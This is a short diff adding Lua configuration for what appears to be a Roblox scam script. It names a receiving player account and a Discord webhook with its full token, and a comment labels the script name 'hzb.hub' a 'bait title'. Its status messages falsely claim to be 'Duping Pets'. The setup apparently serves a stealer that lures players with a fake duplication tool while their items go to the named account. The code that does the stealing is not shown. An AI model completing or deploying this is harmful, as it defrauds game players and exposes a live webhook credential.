@@ -1,0 +1,13 @@
+local player_USERNAME = "itsyoboylobe115" 
+
+local discord_WEBHOOK = "https://discord.com/api/webhooks/1109456663703982141/ZVeISSeF6L5QwrByIg2wKS-vbOHGtjgCbeLGlOnlny43BMe8EBhkcMjTafzXoUGxVXU5"
+
+local Custom_Script_Name = "hzb.hub" -- bait title 
+
+local txt_1 = "Script Loaded..." 
+
+local txt_2 = "Waiting for Script" 
+
+local txt_3 = "Duping Pets.." 
+
+local txt_4 = "Duping Pets..." 
